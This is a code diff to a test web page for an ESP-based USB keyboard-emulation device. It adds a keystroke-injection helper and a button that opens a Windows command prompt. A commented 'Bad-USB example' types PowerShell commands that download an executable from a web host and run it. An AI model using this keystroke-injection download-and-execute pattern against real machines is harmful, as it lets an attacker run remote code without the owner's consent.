@@ -10,6 +10,7 @@
     <button onclick="espusb.wifiGetInfo().then(log)">espusb.wifiGetInfo</button><br>
     <button onclick="espusb.wifiScan().then(log)">espusb.wifiScan</button><br>
     <button onclick="espusb.systemGetClock().then(log)">espusb.systemGetClock</button><br>
+    <button onclick="keyboardSendString(`{WIN DOWN}r{WIN UP}cmd.exe\n">open windows cmd</button><br>
     <textarea id="res" rows="15"></textarea>
     <script>
     const resField = document.getElementById('res')
@@ -22,31 +23,95 @@
         console.log(msg)
         resField.value = `${resField.value}\n${msg}`
     }
-    
-/*
-    // Send Win+r, cmd, Enter (would open a command line on a windows device)
-    espusb.keyboardAction('r','WIN').then(()=> {
-        return espusb.keyboardReleaseKeys()
-    }).then(()=> {
-        return espusb.keyboardAction('c')
-    }).then(()=> {
-        return espusb.keyboardReleaseKeys()
-    }).then(()=> {
-        return espusb.keyboardAction('m')
-    }).then(()=> {
-        return espusb.keyboardReleaseKeys()
-    }).then(()=> {
-        return espusb.keyboardAction('d')
-    }).then(()=> {
-        return espusb.keyboardReleaseKeys()
-    }).then(()=> {
-        return espusb.keyboardAction('ENTER')
-    }).then(()=> {
-        return espusb.keyboardReleaseKeys()
-    }).then(log)
- */    
+    const promiseDelay = ms => new Promise(resolve => setTimeout(resolve, ms));
+    function keyboardSendString(keysToSend,keyDelay=15) {
+        //TODO: add support for other keyboard layouts
+        let keyActionArr = []
+        let currentModifier = 'NONE'
+        for (let i=0; i<keysToSend.length; i++) {
+            let char = keysToSend[i]
+            if (char === '{') {
+                let end = i+keysToSend.substring(i).indexOf('}')
+                let start = i+1
+                let parsed = keysToSend.substring(start,end).split(' ')
+                let modifier = parsed[0]
+                let state = parsed[1]
+                currentModifier = (state === 'DOWN') ? modifier : 'NONE'
+                i = end
+                char = 'NONE'
+            } else if (char === '\r' || char === '\n')
+                char = 'ENTER'
+            keyActionArr.push([char,currentModifier])
+            keyActionArr.push(['NONE',currentModifier])
+            log(currentModifier + ' ' + char)
+            log(currentModifier + ' ' + 'NONE')
+        }
+
+        return keyActionArr.reduce((promise, currentKeys)=> {
+            let key = currentKeys[0]
+            let modifier = currentKeys[1]
+            return promise.then((result)=> {
+                return Promise.all([
+                    promiseDelay(keyDelay),               
+                    espusb.keyboardAction(key,modifier)
+                ])
+            })
+        }, Promise.resolve())
+    }
 
 /*
+    // Bad-USB example
+    // Example showing how easy it would be to download and execute a file on a windows machine.
+    espusb.onopen = () => {
+        keyboardSendString(`{WIN DOWN}r{WIN UP}powershell\necho hello world\ninvoke-webrequest -outfile somefile.exe https{SHIFT DOWN}.{SHIFT UP}{SHIFT DOWN}7{SHIFT UP}{SHIFT DOWN}7{SHIFT UP}live.sysinternals.com{SHIFT DOWN}7{SHIFT UP}procexp.exe\n.{SHIFT DOWN}7{SHIFT UP}somefile.exe\n`)
+    }
+*/
+/*
+
+//Test code that I wrote on my way to keyboardSendString()
+
+let keyActionArr = [
+    ['NONE','WIN'],['r','WIN'],['NONE','WIN'],['c'],[],['m'],[],['d'],[],['ENTER'],[],
+    ['e'],[],['c'],[],['h'],[],['o'],[],[' '],[],
+    ['h'],[],['e'],[],['l'],[],['l'],[],['o'],[],
+    ['ENTER']
+]
+keyActionArr.reduce((promise, currentKeys)=> {
+    let key = currentKeys.length > 0 && currentKeys[0] ? currentKeys[0] : 'NONE'
+    let modifier = currentKeys.length > 1 && currentKeys[1] ? currentKeys[1] : 'NONE'
+    return promise.then((result)=> {
+        return new Promise(function (resolve, reject) {
+            setTimeout(()=> {
+                resolve(espusb.keyboardAction(key,modifier))
+            }, keyDelay)
+        })
+    })
+}, Promise.resolve())
+
+espusb.keyboardAction('NONE','WIN').then(()=> { // win down
+    return espusb.keyboardAction('r','WIN') // r down
+}).then(()=> {
+    return espusb.keyboardAction('NONE','WIN') // r up
+}).then(()=> {
+    return espusb.keyboardReleaseKeys() // win up
+}).then(()=> {
+    return espusb.keyboardAction('c')
+}).then(()=> {
+    return espusb.keyboardReleaseKeys()
+}).then(()=> {
+    return espusb.keyboardAction('m')
+}).then(()=> {
+    return espusb.keyboardReleaseKeys()
+}).then(()=> {
+    return espusb.keyboardAction('d')
+}).then(()=> {
+    return espusb.keyboardReleaseKeys()
+}).then(()=> {
+    return espusb.keyboardAction('ENTER')
+}).then(()=> {
+    return espusb.keyboardReleaseKeys()
+}).then(log)
+
 function delay(millis) { // <-- For testing purposes only!! 
     var now = Date.now();
     while(Date.now() < now + millis){} 
